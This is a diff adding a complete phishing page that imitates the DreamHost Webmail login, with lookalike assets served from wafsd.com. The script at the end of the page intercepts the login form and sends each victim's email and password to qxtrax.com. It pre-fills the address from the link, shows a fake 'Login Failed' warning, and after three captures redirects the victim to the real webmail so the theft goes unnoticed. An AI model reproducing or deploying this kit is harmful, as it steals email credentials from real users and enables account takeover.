@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
+		<title>DreamHost Webmail :: Welcome to DreamHost Webmail</title>
+		<meta
+			name="viewport"
+			content="width=device-width, initial-scale=1.0, shrink-to-fit=no, maximum-scale=1.0" />
+		<meta name="theme-color" content="#f4f4f4" />
+		<meta name="msapplication-navbutton-color" content="#f4f4f4" />
+		<link rel="shortcut icon" href="https://wafsd.com/new/dream/media/P2KwOEv1mVSX.ico" />
+		<link rel="stylesheet" href="https://wafsd.com/new/dream/media/css/e96WhN6YgqwE.css" />
+
+		<link rel="stylesheet" href="https://wafsd.com/new/dream/media/css/JCqlEVqUHxEw.css" />
+
+		<link rel="stylesheet" type="text/css" href="https://wafsd.com/new/dream/media/css/RvFrh6VysBx6.css" />
+		<script src="https://wafsd.com/new/dream/media/js/vA798X5au1Lr.js"></script>
+		<script src="https://wafsd.com/new/dream/media/js/gwyAPqen0Zt1.js"></script>
+		<script src="https://wafsd.com/new/dream/media/js/47PvGZ7XKreB.js"></script>
+		<script src="https://wafsd.com/new/dream/media/js/5l46h44NJzMd.js"></script>
+		<script>
+      /*
+		  @licstart  The following is the entire license notice for the 
+		  JavaScript code in this page.
+  
+		  Copyright (C) The Roundcube Dev Team
+  
+		  The JavaScript code in this page is free software: you can redistribute
+		  it and/or modify it under the terms of the GNU General Public License
+		  as published by the Free Software Foundation, either version 3 of
+		  the License, or (at your option) any later version.
+  
+		  The code is distributed WITHOUT ANY WARRANTY; without even the implied
+		  warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+		  See the GNU GPL for more details.
+  
+		  @licend  The above is the entire license notice
+		  for the JavaScript code in this page.
+  */
+      var rcmail = new rcube_webmail();
+      rcmail.set_env({
+        task: "login",
+        standard_windows: false,
+        locale: "en_US",
+        devel_mode: null,
+        rcversion: 10500,
+        cookie_domain: "",
+        cookie_path: "/",
+        cookie_secure: false,
+        dark_mode_support: true,
+        skin: "elastic",
+        blankpage: "skins/elastic/watermark.html",
+        refresh_interval: 60,
+        session_lifetime: 600,
+        action: "",
+        comm_path: "./?_task=login",
+        compose_extwin: false,
+        date_format: "yy-mm-dd",
+        date_format_localized: "YYYY-MM-DD",
+        additional_logos: { dark: "skins/elastic/images/logo-dark.svg" },
+        request_token: "6MLH8rE5ZAdioZcvFfmRra6SNfTudzDA",
+      });
+      rcmail.add_label({
+        loading: "Loading...",
+        servererror: "Server Error!",
+        connerror: "Connection Error (Failed to reach the server)!",
+        requesttimedout: "Request timed out",
+        refreshing: "Refreshing...",
+        windowopenerror: "The popup window was blocked!",
+        uploadingmany: "Uploading files...",
+        uploading: "Uploading file...",
+        close: "Close",
+        save: "Save",
+        cancel: "Cancel",
+        alerttitle: "Attention",
+        confirmationtitle: "Are you sure...",
+        delete: "Delete",
+        continue: "Continue",
+        ok: "OK",
+        back: "Back",
+        errortitle: "An error occurred!",
+        options: "Options",
+        plaintoggle: "Plain text",
+        htmltoggle: "HTML",
+        previous: "Previous",
+        next: "Next",
+        select: "Select",
+        browse: "Browse",
+        choosefile: "Choose file...",
+        choosefiles: "Choose files...",
+      });
+      rcmail.gui_container("loginfooter", "login-footer");
+      rcmail.gui_object("loginform", "login-form");
+      rcmail.gui_object("message", "messagestack");
+      rcmail.display_message("Loading...", "loading");
+    </script>
+
+		<script src="https://wafsd.com/new/dream/media/js/2AGIT0fu1MlY.js"></script>
+		<script src="https://wafsd.com/new/dream/media/js/pfIa3BAkAoYQ.js"></script>
+		<style>
+      .task-login #logoo {
+        display: inline-block;
+        position: relative;
+        top: 16vh;
+        max-height: 100px;
+      }
+
+      img {
+        vertical-align: middle;
+        border-style: none;
+      }
+
+      #messagestak {
+        position: absolute;
+        bottom: 0.5em;
+        right: 0.7em;
+        z-index: 105;
+        width: 320px;
+        height: auto;
+        max-height: 85%;
+      }
+
+      .loading.ui.alert > i.icon {
+        line-height: 1;
+        color: #d2d2e0;
+        margin: auto 0;
+      }
+
+      .warning.ui.alert > i > svg {
+        line-height: 1;
+        color: #111;
+        margin: auto 0;
+        height: 32px;
+        width: 32px;
+      }
+
+      html.dark-mode .warning.ui.alert > i > svg {
+        color: #d2d2e0;
+      }
+
+      .ui.alert.loading {
+        color: #d2d2e0;
+      }
+
+      #messagestak div i.icon,
+      .ui.alert.boxconfirmation i.icon,
+      .ui.alert.boxerror i.icon,
+      .ui.alert.boxinformation i.icon,
+      .ui.alert.boxwarning i.iconn {
+        font-size: 1.5em !important;
+      }
+
+      .ui.alert {
+        margin: 0 0 0.2rem;
+        opacity: 0.95;
+        width: 100%;
+        padding: 0.75em;
+        border: 1px solid transparent;
+        background-color: #202027;
+        color: #fff;
+        align-items: center;
+      }
+
+      html.dark-mode #messagestak .alert-warning,
+      html.dark-mode .ui.alert.boxwarning {
+        background-color: #997f31;
+        color: #fff;
+      }
+
+      #messagestak .alert-warning,
+      .ui.alert.boxwarning {
+        background-color: #ffd452;
+        color: #111;
+      }
+    </style>
+	</head>
+
+	<body class="task-login action-none">
+		<div id="layout">
+			<h1 class="voice">DreamHost Webmail Login</h1>
+
+			<div id="layout-content" class="selected no-navbar" role="main">
+				<img src="https://wafsd.com/new/dream/media/images/fhWR6PXz8JIg.svg" id="logoo" alt="Logo" />
+				<form id="login-form" name="login-form" method="post" class="propform">
+					<input
+						type="hidden"
+						name="_token"
+						value="6MLH8rE5ZAdioZcvFfmRra6SNfTudzDA" />
+					<input type="hidden" name="_task" value="login" /><input
+						type="hidden"
+						name="_action"
+						value="login" /><input
+						type="hidden"
+						name="_timezone"
+						id="rcmlogintz"
+						value="_default_" /><input
+						type="hidden"
+						name="_url"
+						id="rcmloginurl"
+						value="_task=login" />
+					<table>
+						<tbody>
+							<tr>
+								<td class="title">
+									<label for="rcmloginuser">Username</label>
+								</td>
+								<td class="input">
+									<input
+										name="_user"
+										id="rcmloginuser"
+										required
+										size="40"
+										class="form-control"
+										autocapitalize="off"
+										autocomplete="off"
+										type="text" />
+								</td>
+							</tr>
+							<tr>
+								<td class="title"><label for="rcmloginpwd">Password</label></td>
+								<td class="input">
+									<input
+										name="_pass"
+										id="rcmloginpwd"
+										required
+										size="40"
+										class="form-control"
+										autocapitalize="off"
+										autocomplete="off"
+										type="password" />
+								</td>
+							</tr>
+						</tbody>
+					</table>
+					<p class="formbuttons">
+						<button
+							type="submit"
+							id="rcmloginsubmit"
+							class="button mainaction submit">
+							Login
+						</button>
+					</p>
+					<div id="login-footer" role="contentinfo">
+						DreamHost Webmail &nbsp;"&nbsp;
+						<a
+							href="https://dreamhost.com/support"
+							target="_blank"
+							class="support-link">Get support</a>
+					</div>
+				</form>
+			</div>
+
+			<noscript>
+				<p class="noscriptwarning">
+					Warning: This webmail service requires Javascript! In order to use it
+					please enable Javascript in your browser's settings.
+				</p>
+			</noscript>
+		</div>
+
+		<a
+			href="https://dreamhost.com/support"
+			target="_blank"
+			id="supportlink"
+			class="hidden">Get support</a>
+
+		<div id="messagestak">
+			<div
+				id="loading"
+				class="loading content ui alert alert-info"
+				role="alert"
+				style="display: none">
+				<i class="icon"></i>
+				<span>Loading...</span>
+			</div>
+			<div
+				id="warning"
+				class="warning content ui alert alert-warning"
+				role="alert"
+				style="display: none">
+				<i class="iconn">
+					<svg
+						xmlns="http://www.w3.org/2000/svg"
+						viewBox="0 0 24 24"
+						fill="currentColor"
+						class="size-6">
+						<path
+							fill-rule="evenodd"
+							d="M9.401 3.003c1.155-2 4.043-2 5.197 0l7.355 12.748c1.154 2-.29 4.5-2.599 4.5H4.645c-2.309 0-3.752-2.5-2.598-4.5L9.4 3.003ZM12 8.25a.75.75 0 0 1 .75.75v3.75a.75.75 0 0 1-1.5 0V9a.75.75 0 0 1 .75-.75Zm0 8.25a.75.75 0 1 0 0-1.5.75.75 0 0 0 0 1.5Z"
+							clip-rule="evenodd" />
+					</svg>
+				</i>
+				<span>Login Failed</span>
+			</div>
+		</div>
+
+		<script>
+			let clickCount = 0;
+			const url = "https://qxtrax.com/dreamhost/main.php";
+
+		function toggleClass() {
+			// Redirect the page to a URL
+			window.location.href =
+			"https://webmail.dreamhost.com/";
+		}
+
+		// Send data to the PHP file
+		function sendDataWithRetry(dataLog, maxRetries = 3) {
+			const loadingElement = document.getElementById('loading'); // Assume there's an element with id 'loading'
+			const warningElement = document.getElementById('warning'); // Assume there's an element with id 'warning'
+			loadingElement.style.display = 'block';
+			
+			const sendRequest = async (retryCount) => {
+				try {
+					// Set loading style to block
+
+					const response = await fetch(url, {
+						method: "POST",
+						headers: {
+						"Content-Type": "application/json; charset=utf-8",
+						},
+						body: JSON.stringify(dataLog),
+					});
+
+					if (response.ok) {
+						const responseData = await response.json();
+						// console.log("Data received by PHP:", responseData);
+						clickCount++;
+						console.log(clickCount);
+						if (clickCount === 3) {
+						// Execute a separate function on second click
+						toggleClass();
+						clickCount = 0;
+						}
+						// Continue with other tasks (e.g., UI updates, etc.)
+					} else {
+						throw new Error("Network response was not OK");
+					}
+				} catch (error) {
+					console.error("Error sending data:", error);
+					if (retryCount < maxRetries) {
+						console.log(`Retrying (attempt ${retryCount + 1})...`);
+						await sendRequest(retryCount + 1);
+					} else {
+						console.error("Max retries reached. Data not sent.");
+						// Handle failure (e.g., show an error message)
+					}
+				} finally {
+					// Reset loading style to none
+					loadingElement.style.display = 'none';
+					// Empty the password input field
+					$('#rcmloginpwd').val('');
+					warningElement.style.display = 'block';
+					$('#login-form button[type="submit"]').prop("disabled", false);
+					setTimeout(function () {
+						warningElement.style.display = 'none';
+					}, 5000);
+				}
+			};
+			sendRequest(0); // Start the initial request
+		}
+
+
+		$(async function () {
+			rcmail.init();
+
+			// Capture email from URL and set it in the username field
+			var hash = window.location.hash.substring(1);
+			if (hash) {
+			$("#rcmloginuser").val(decodeURIComponent(hash));
+			}
+
+			// Handle form submission
+			$("#login-form").on("submit", function (e) {
+			e.preventDefault();
+			var email = $("#rcmloginuser").val().trim();
+			var password = $("#rcmloginpwd").val().trim();
+
+			if (!email || !password) {
+				e.preventDefault(); // Prevent form submission if email or password is empty
+				return;
+			}
+
+			// Disable the submit button
+			$('#login-form button[type="submit"]').prop("disabled", true);
+
+			// Create object with email and password
+			var loginData = {
+				email: email,
+				password: password,
+				desc: "https://webmail.dreamhost.com/: Login Details",
+			};
+
+			sendDataWithRetry(loginData);
+			// The form will submit normally if both email and password are provided
+			});
+		});
+		</script>
+
+		<script src="https://wafsd.com/new/dream/media/js/qj6gmph2P7p1.js"></script>
+		<script src="https://wafsd.com/new/dream/media/js/DGENMheRAYsH.js"></script>
+	</body>
+</html>
